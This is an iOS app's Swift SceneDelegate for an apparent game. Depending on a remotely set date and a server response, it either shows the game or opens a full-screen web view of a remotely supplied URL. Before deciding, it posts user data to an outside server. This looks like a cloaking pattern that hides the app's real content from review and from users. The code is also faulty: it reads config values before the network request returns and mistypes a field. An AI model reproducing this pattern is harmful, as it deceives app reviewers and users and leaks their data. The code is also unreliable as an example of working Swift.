//
//  SceneDelegate.swift
//  Game1
//
//  Created by Александр Андреев on 01.08.2024.
//

import UIKit

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    var window: UIWindow?
    var lastDate: Date!
    var urlRemoteConfig = "https://www.google.com"
    var jsonResponse: [String: Any] = [:]
    var isBlock: Bool!
    var isResetUrlLink: Bool!

    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
            guard let windowScene = (scene as? UIWindowScene) else { return }
        
            setupConfig()
            if lastDate <= Date() {
                let hasNoParentSaved = UserDefaults.standard.integer(forKey: "hasNoParent")
                if hasNoParentSaved == 0 {
                    setupZeroView(windowScene: windowScene)
                } else {
                    //POST
                    getHasNoParent { hasNoParent in
                        if let hasNoParent = hasNoParent {
                            self.setupUI(hasNoParent: hasNoParent, windowScene: windowScene)
                        } else {
                            print("Не удалось получить значение 'has_no_parent'")
                            // Получаем значение параметра "isDead" от Remote Config и если выставлено значение "False" - выдаем 1, иначе если "True" - выдаем 0.
                            if self.isBlock == false {
                                self.setupUI(hasNoParent: 1, windowScene: windowScene)
                            } else {
                                self.setupUI(hasNoParent: 0, windowScene: windowScene)
                            }
                            
                        }
                    }
                }
            } else {
                setupLoadingView(windowScene: windowScene)
            }
        
            
            
        }
    
    private func setupConfig() {
        let urlString = "https://appstorage.org/api/conf/cr4zybubbl3t1m3qu3st"
        NetworkManager.shared.performGetRequest(urlString: urlString) { result in
            switch result {
            case .success(let json):
                // Успешный ответ, обрабатываем JSON
                if let jsonDict = json as? [String: Any] {
                    print("Успешно получили данные: \(jsonDict)")
                    self.jsonResponse = jsonDict
                }
                
            case .failure(let error):
                // Обработка ошибки
                print("Ошибка: \(error.localizedDescription)")
            }
        }
        setupDate()
        setupURL()
        setupIsResetUrlLink()
        setupIsBlock()
    }
    
    private func setupIsBlock() {
        self.isBlock = jsonResponse["isBlock"] as? Bool
    }
    
    private func setupURL() {
        self.urlRemoteConfig = jsonResponse["urlLink"] as! String
    }
    
    private func setupIsResetUrlLink() {
        self.isResetUrlLink = jsonResponse["urlLink"] as? Bool
    }
    
    private func setupDate() {
        // Извлекаем значение "date" из JSON
        let dateString = jsonResponse["date"] as! String
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        
        // Преобразуем строку в объект Date
        let date = dateFormatter.date(from: dateString)
        self.lastDate = date
    }
    
    private func setupUI(hasNoParent: Int, windowScene: UIWindowScene) {
        if hasNoParent == 1 {
            setupLoadingView(windowScene: windowScene)
        } else {
            //в первый ли раз заходим
            UserDefaults.standard.set(hasNoParent, forKey: "hasNoParent")
            
            if UserDefaults.standard.bool(forKey: "isNotFirstTime") {
                if isResetUrlLink {
                    //запускать страховку?
                    UserDefaults.standard.set(urlRemoteConfig, forKey: "savedURL")
                }
                setupZeroView(windowScene: windowScene)
            } else {
                openLinkWithTimeout(windowScene: windowScene)
            }
        }
    }
    
    private func openLinkWithTimeout(windowScene: UIWindowScene) {
        let vc = ZeroViewController(urlString: urlRemoteConfig)
        vc.view.backgroundColor = .white
        //работа со ссылкой
        window = UIWindow(windowScene: windowScene)
        window?.windowScene = windowScene
        window?.rootViewController = vc
        window?.makeKeyAndVisible()

        // Запускаем таймер на 5 секунд
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) { [self] in
            // Проверяем, загрузилась ли страница
            if vc.isPageLoaded {
                UserDefaults.standard.set(urlRemoteConfig, forKey: "savedURL")
                UserDefaults.standard.set(true, forKey: "isNotFirstTime")
            }
        }
    }

    
    private func setupZeroView(windowScene: UIWindowScene) {
        let urlString = UserDefaults.standard.string(forKey: "savedURL") ?? "https://www.google.com"
        let vc = ZeroViewController(urlString: urlString)
        window = UIWindow(windowScene: windowScene)
        window?.windowScene = windowScene
        window?.makeKeyAndVisible()
        window?.rootViewController = vc
    }
    
    private func setupLoadingView(windowScene: UIWindowScene) {
        window = UIWindow(windowScene: windowScene)
        window?.windowScene = windowScene
        window?.makeKeyAndVisible()
        window?.rootViewController = LoadingViewController()
        AudioManager.shared.startBackgroundMusic()
    }
    
    // Метод для выполнения запроса и получения значения
    private func getHasNoParent(completion: @escaping (Int?) -> Void) {
        guard let url = URL(string: "https://neuralwebmatrix.fun/app/cr4zybubbl3t1m3qu3st") else {
            completion(nil)
            return
        }
        
        guard let data = JSONCreator.shared.createUserData() else {
            completion(nil)
            return
        }
        
        let dispatchGroup = DispatchGroup()
        var jsonResponse: [String: Any]?
        var requestError: Error?
        var timeoutReached = false
        
        dispatchGroup.enter()
        
        // Выполняем запрос
        NetworkManager.shared.sendPostRequest(urlString: url.absoluteString, jsonData: data) { result in
            switch result {
            case .success(let json):
                jsonResponse = json
            case .failure(let error):
                requestError = error
            }
            
            dispatchGroup.leave()
        }
        
        // Запускаем таймер для отсчета времени
        let timeoutInterval: TimeInterval = 7
        DispatchQueue.global().asyncAfter(deadline: .now() + timeoutInterval) {
            timeoutReached = true
            dispatchGroup.leave()
        }
        
        // Ожидаем завершения запросов и таймера
        dispatchGroup.notify(queue: .main) {
            if timeoutReached {
                // Тайм-аут
                if let error = requestError {
                    print("Ошибка: \(error.localizedDescription)")
                } else {
                    print("Тайм-аут: запрос не завершился в течение 7 секунд.")
                    completion(nil)
                }
            } else {
                // Запрос завершился раньше тайм-аута
                if let json = jsonResponse, let hasNoParent = json["has_no_parent"] as? Int {
                    completion(hasNoParent)
                } else {
                    completion(nil)
                }
            }
        }
    }

    func switchToMainScreen() {
        let mainViewController = MainViewController()

        window?.rootViewController = mainViewController
        window?.makeKeyAndVisible()
    }
}
// Метод для открытия ссылки с тайм-аутом
//private func withRemote() {
//    if lastDate <= Date() {
//        let isFirstLaunch = !UserDefaults.standard.bool(forKey: "hasLaunchedBefore")
//        
//        if isFirstLaunch {
//            getHasNoParent { hasNoParent in
//                if let hasNoParent = hasNoParent, hasNoParent == 0 {
//                    self.openLinkWithTimeout(windowScene: windowScene)
//                } else {
//                    print("Не удалось получить значение 'has_no_parent'")
//                    //ADD: - remote config
//                    self.setupLoadingView(windowScene: windowScene)
//                }
//            }
//        } else {
//            //ADD: - remote config
//            let hasNoParentSaved = UserDefaults.standard.integer(forKey: "hasNoParent")
//            if hasNoParentSaved == 0 {
//                setupZeroView(windowScene: windowScene)
//            } else {
//                // если сегодняшняя дата больше или равна lastDate
//                getHasNoParent { hasNoParent in
//                    if let hasNoParent = hasNoParent, hasNoParent == 0 {
//                        self.openLinkWithTimeout(windowScene: windowScene)
//                    } else {
//                        print("Не удалось получить значение 'has_no_parent'")
//                        //ADD: - remote config
//                        self.setupLoadingView(windowScene: windowScene)
//                    }
//                }
//            }
//        }
//
//    } else {
//        setupLoadingView(windowScene: windowScene)
//    }
//}
//    private func openLinkWithTimeout(windowScene: UIWindowScene) {
//        
//        let vc = ZeroViewController(urlString: urlString)
//        vc.view.backgroundColor = .white
//        //работа со ссылкой
//        window = UIWindow(windowScene: windowScene)
//        window?.windowScene = windowScene
//        window?.rootViewController = vc
//        window?.makeKeyAndVisible()
//        
//        // Запускаем таймер на 5 секунд
//        DispatchQueue.main.asyncAfter(deadline: .now() + 5) { [self] in
//            // Проверяем, загрузилась ли страница
//            if !vc.isPageLoaded {
//                // Если не загрузилась, удаляем сохранение ссылки и hasNoParent
//                UserDefaults.standard.removeObject(forKey: "hasNoParent")
//                UserDefaults.standard.removeObject(forKey: "savedURL")
//            } else {
//                // Если загрузилась, сохраняем hasNoParent и ссылку
//                UserDefaults.standard.set(0, forKey: "hasNoParent")
//                UserDefaults.standard.set(urlString, forKey: "savedURL")
//            }
//        }
//    }
